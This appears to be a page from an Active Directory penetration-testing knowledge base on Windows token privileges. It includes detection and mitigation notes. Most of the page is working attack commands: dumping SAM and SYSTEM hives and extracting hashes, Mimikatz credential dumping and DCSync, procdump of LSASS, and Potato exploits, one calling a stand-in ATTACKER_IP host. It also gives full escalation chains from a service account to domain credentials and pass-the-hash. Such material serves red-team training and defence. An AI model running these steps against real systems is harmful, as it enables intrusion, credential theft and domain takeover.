# Privileged Accounts and Token Privileges

## Overview

Windows access tokens determine what a process or thread can do on a system. Token privileges are rights granted to a user or group that allow specific security-relevant operations — like debugging processes, backing up files, or impersonating users. Many AD escalation paths start by exploiting a token privilege on a compromised host.

## What Are Access Tokens

Every process and thread on Windows has an **access token** that contains:

- User SID
- Group SIDs
- Privileges (enabled and disabled)
- Token type (primary or impersonation)
- Integrity level
- Session ID

### Token Types

| Type | Description | Usage |
|------|-------------|-------|
| **TokenPrimary** | Assigned to a process | Represents the process's security context |
| **TokenImpersonation** | Used by threads to impersonate | Allows acting as another user |

### Impersonation Token Levels

| Level | Description | Can Identify | Can Impersonate | Can Delegate |
|-------|-------------|:------------:|:---------------:|:------------:|
| SecurityAnonymous | No identity information | No | No | No |
| SecurityIdentification | Can identify the user | Yes | No | No |
| SecurityImpersonation | Can act as the user locally | Yes | Yes | No |
| SecurityDelegation | Can act as the user remotely | Yes | Yes | Yes |

## Listing Token Privileges

### whoami

```cmd
# List all privileges for current user
whoami /priv

# Detailed user and group information
whoami /all

# Show groups (useful for domain group membership)
whoami /groups
```

### whoami /priv Output Example

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### PowerShell

```powershell
# Get token privileges
(New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())).UserClaims

# List enabled privileges
$token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$token | Select-Object -ExpandProperty Claims | Where-Object {$_.Value -match "Se"}
```

## Key Privileges for AD Escalation

### Critical Privileges

| Privilege | Constant | Description | Escalation Potential |
|-----------|----------|-------------|---------------------|
| SeBackupPrivilege | `SeBackupPrivilege` | Read any file regardless of ACL | **Extreme** — Dump SAM/reg hives |
| SeRestorePrivilege | `SeRestorePrivilege` | Write any file regardless of ACL | **Extreme** — Replace system files |
| SeTakeOwnershipPrivilege | `SeTakeOwnershipPrivilege` | Take ownership of any object | **Extreme** — Own any file/reg key |
| SeDebugPrivilege | `SeDebugPrivilege` | Debug any process | **Extreme** — Dump LSASS |
| SeImpersonatePrivilege | `SeImpersonatePrivilege` | Impersonate client after auth | **High** — Token theft, potato attacks |
| SeAssignPrimaryTokenPrivilege | `SeAssignPrimaryTokenPrivilege` | Assign primary token to process | **High** — Combined with impersonation |
| SeTcbPrivilege | `SeTcbPrivilege` | Act as part of the OS | **Extreme** — Full system control |
| SeCreateTokenPrivilege | `SeCreateTokenPrivilege` | Create custom access tokens | **Extreme** — Forge admin tokens |
| SeLoadDriverPrivilege | `SeLoadDriverPrivilege` | Load/unload kernel drivers | **High** — Kernel code execution |
| SeMachineAccountPrivilege | `SeMachineAccountPrivilege` | Add workstations to domain | **Medium** — MAQ abuse, RBCD |
| SeEnableDelegationPrivilege | `SeEnableDelegationPrivilege` | Enable delegation for accounts | **High** — Kerberos delegation abuse |

### Supporting Privileges

| Privilege | Description | Value |
|-----------|-------------|-------|
| SeSecurityPrivilege | Manage security audit log | Access to audit trails |
| SeRemoteShutdownPrivilege | Remote shutdown | Limited |
| SeIncreaseQuotaPrivilege | Increase process quotas | Limited |
| SeIncreaseBasePriorityPrivilege | Increase scheduling priority | Limited |
| SeSystemEnvironmentPrivilege | Modify firmware environment | Limited |

## Abusing SeBackupPrivilege

SeBackupPrivilege allows reading any file on the system, regardless of ACL — it bypasses file read permissions. This is designed for backup software.

### What You Can Do

- Read the SAM registry hive (extract local account hashes)
- Read the SYSTEM registry hive (boot key)
- Read NTDS.dit (if on DC)
- Read any protected file

### Exploitation

```cmd
# Save SAM and SYSTEM registry hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Transfer and extract hashes offline
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
```

```powershell
# PowerShell with SeBackupPrivilege
# Requires enabling the privilege first
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive
```

### Detection

- Event ID 4657 — Registry value modified (reg save)
- Event ID 4663 — Access to protected files

## Abusing SeRestorePrivilege

SeRestorePrivilege allows writing any file, regardless of ACL. This is designed for backup restore operations.

### What You Can Do

- Overwrite system files
- Replace service binaries
- Write to protected directories
- Modify registry hives

### Exploitation

```cmd
# Overwrite a service binary with a malicious one
icacls C:\Windows\System32\legit_service.exe /grant Users:F
copy malicious.exe C:\Windows\System32\legit_service.exe

# Or modify registry to change service paths
```

## Abusing SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege allows taking ownership of any securable object.

### Exploitation

```cmd
# Take ownership of a file
takeown /f C:\ProtectedFile.dat

# Take ownership of a registry key
takeown /f HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService

# After taking ownership, grant yourself permissions
icacls C:\ProtectedFile.dat /grant Users:F
```

```powershell
# Using PowerShell
$path = "C:\ProtectedFile.dat"
takeown /f $path
icacls $path /grant "$env:USERNAME`:F"
```

## Abusing SeDebugPrivilege

SeDebugPrivilege allows debugging any process — including LSASS. This is the most commonly abused privilege for credential theft.

### Process Injection

```cmd
# Using Mimikatz
privilege::debug
sekurlsa::logonpasswords

# Using procdump to dump LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```csharp
// C# — OpenProcess with PROCESS_ALL_ACCESS
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

IntPtr hProcess = OpenProcess(0x1FFFFF, false, lsassPID);  // PROCESS_ALL_ACCESS
```

### Code Injection via SeDebugPrivilege

```powershell
# PowerShell — Inject into a privileged process
$process = Get-Process -Name "winlogon"
$handle = $process.Handle
# Use Win32 API calls to inject shellcode
```

### Detection

- Event ID 4656 — Handle to LSASS requested
- Event ID 4663 — Access to LSASS process
- Event ID 4688 — Process creation (procdump, mimikatz)

## Abusing SeImpersonatePrivilege

SeImpersonatePrivilege allows impersonating authenticated users. This is the foundation of all "Potato" family privilege escalation attacks.

### Potato Family Attacks

| Tool | Technique | Requirements |
|------|-----------|--------------|
| JuicyPotato | DCOM + RPC → Named Pipe impersonation | SeImpersonate, Windows 2008-2016 |
| RoguePotato | OXID resolver → Named Pipe | SeImpersonate, Windows 10/2016+ |
| PrintSpoofer | Printer spooler → Named Pipe | SeImpersonate, Windows 10/2019+ |
| GodPotato | Named Pipe → Token duplication | SeImpersonate, Windows 10/2019+ |
| EfsPotato | EFSRPC → Named Pipe | SeImpersonate, Windows 10/2019+ |
| CoercedPotato | MS-EFSRPC + named pipe | SeImpersonate |

### Basic Potato Exploitation

```cmd
# PrintSpoofer — easiest for modern Windows
PrintSpoofer.exe -i -c cmd.exe

# RoguePotato
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999

# GodPotato
GodPotato.exe -cmd "cmd.exe"
```

### How PrintSpoofer Works

1. Exploits the print spooler's named pipe impersonation
2. Creates a named pipe and waits for SYSTEM to connect
3. When SYSTEM connects, the thread can impersonate SYSTEM via SeImpersonatePrivilege
4. Duplicate the token and use it to create a new process as SYSTEM

### Detection

- Event ID 5156 — Windows Filtering Platform connection
- Event ID 5145 — Named pipe access
- Unusual named pipe creation events

## Abusing SeAssignPrimaryTokenPrivilege

SeAssignPrimaryTokenPrivilege allows assigning a primary token to a new process. Combined with SeImpersonatePrivilege, this is extremely powerful for privilege escalation.

### Exploitation

```powershell
# If you have an impersonation token, assign it as primary
# This allows creating a process with the impersonated user's token
# Typically requires both SeImpersonate and SeAssignPrimaryToken
```

## Abusing SeTcbPrivilege

SeTcbPrivilege ("Act as part of the operating system") is the most powerful privilege — it grants nearly unlimited access.

### What You Can Do

- Create tokens from scratch
- Modify system time
- Perform any operation as SYSTEM
- Bypass all security checks

### Exploitation

```cmd
# Using SeTcbPrivilege to create a token
# This can be used with LsaLogonUser to create a SYSTEM token
```

## Abusing SeCreateTokenPrivilege

SeCreateTokenPrivilege allows creating arbitrary access tokens, including tokens with any user SID and group memberships.

### Exploitation

```powershell
# A process with SeCreateTokenPrivilege can create a token
# with Administrator SID and all admin groups, then launch
# a process with that token
```

## Abusing SeLoadDriverPrivilege

SeLoadDriverPrivilege allows loading kernel-mode drivers, which can be used to execute code in kernel context.

```cmd
# Load a vulnerable driver to gain kernel access
# Tools: Capcom.sys, gdrv.sys, etc.
```

## How to Get These Privileges

### Local Admin

Local Administrators group members get:
- SeBackupPrivilege
- SeRestorePrivilege
- SeDebugPrivilege
- SeTakeOwnershipPrivilege
- SeLoadDriverPrivilege
- SeShutdownPrivilege
- SeChangeNotifyPrivilege

### SYSTEM Account

SYSTEM has **all** privileges enabled:
- SeTcbPrivilege
- SeCreateTokenPrivilege
- SeImpersonatePrivilege
- All admin privileges

### Service Accounts

Services running as `NETWORK SERVICE` or `LOCAL SERVICE` may have:
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- Limited other privileges

### Misconfigured Services

```
Check services running as SYSTEM with non-SYSTEM accounts
  → The service's token has SYSTEM privileges
  → Modify the service binary or config to execute your code
```

### Group Policy Assignments

```
User Rights Assignment GPO settings:
- Backup files and directories → SeBackupPrivilege
- Restore files and directories → SeRestorePrivilege
- Take ownership of files or other objects → SeTakeOwnershipPrivilege
- Debug programs → SeDebugPrivilege
- Impersonate a client after authentication → SeImpersonatePrivilege
- Act as part of the operating system → SeTcbPrivilege
- Create a token object → SeCreateTokenPrivilege
- Load and unload device drivers → SeLoadDriverPrivilege
- Add workstations to domain → SeMachineAccountPrivilege
- Enable computer and user accounts to be trusted for delegation → SeEnableDelegationPrivilege
```

## Tools for Enumerating Token Privileges

### WinPEAS

```cmd
# Check all privileges and exploitable misconfigurations
winpeas.exe

# Check for token privileges specifically
winpeas.exe systeminfo
```

### PowerUp

```powershell
# Find users with SeImpersonatePrivilege
Get-ModifiableService | Where-Object {$_.CanPrivilege -match "SeImpersonate"}

# Check for service exploits
Invoke-AllChecks
```

### SeatBelt

```cmd
# Token privilege enumeration
Seatbelt.exe TokenPrivileges

# All user checks
Seatbelt.exe -group=user

# System-wide checks
Seatbelt.exe -group=system
```

### Custom PowerShell Enumeration

```powershell
# Check for SeImpersonatePrivilege
$current = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($current)
$claims = $principal.UserClaims | Where-Object { $_.Value -match "^Se" }
$claims | Select Value

# Check specific privilege
$impersonate = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$current = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($current)
$hasDebug = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
```

## Complete Privilege Escalation Chain

### Scenario: SeImpersonatePrivilege → SYSTEM → DCSync

```cmd
# 1. Initial access — low-privilege service account
whoami /priv
# Shows: SeImpersonatePrivilege Enabled

# 2. Exploit SeImpersonatePrivilege with PrintSpoofer
PrintSpoofer.exe -i -c cmd.exe

# 3. Now running as SYSTEM
whoami
# Shows: NT AUTHORITY\SYSTEM

# 4. Dump credentials
privilege::debug
sekurlsa::logonpasswords

# 5. If on DC or with DA creds, DCSync
lsadump::dcsync /domain:domain.local /all /csv
```

### Scenario: SeBackupPrivilege → Local Hash Extraction

```cmd
# 1. User has SeBackupPrivilege (part of Backup Operators)
whoami /priv
# Shows: SeBackupPrivilege Enabled

# 2. Save registry hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# 3. Extract hashes offline
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL

# 4. PtH to other machines
nxc smb target -u Administrator -H HASH -d domain.local
```

## Detection and Mitigations

| Privilege | Detection | Mitigation |
|-----------|-----------|------------|
| SeBackupPrivilege | Event ID 4657 (reg save) | Restrict Backup Operators group |
| SeRestorePrivilege | Event ID 4663 (file writes) | Restrict who gets this right |
| SeDebugPrivilege | Event ID 4656 (LSASS access) | Enable LSASS protection |
| SeImpersonatePrivilege | Event ID 5156, 5145 | Remove from service accounts |
| SeTcbPrivilege | Event ID 4672 (special logon) | Never assign to user accounts |
| SeLoadDriverPrivilege | Event ID 4672, 4697 | Block vulnerable drivers |

### LSASS Protection

```cmd
# Enable LSASS as PPL (Protected Process Light)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

### Removing Unnecessary Privileges

```powershell
# Check current assignment of SeImpersonatePrivilege
# via GPO: Computer Configuration > Windows Settings > Security Settings
# > Local Policies > User Rights Assignment
# > Impersonate a client after authentication

# Remove SERVICE accounts from this right where possible
```

## Cross-References

- [Local Windows Privilege Escalation](./01_Local_PrivEsc_Windows.md)
- [Unconstrained Delegation](./05_Unconstrained_Delegation.md)
- [Tools Reference - WinPEAS](../09_Tools_Reference/README.md)
- [Tools Reference - PowerUp](../09_Tools_Reference/README.md)
- [Pass the Hash with Machine Accounts](../04_Lateral_Movement/12_Pass_The_Hash_Machine_Accounts.md)
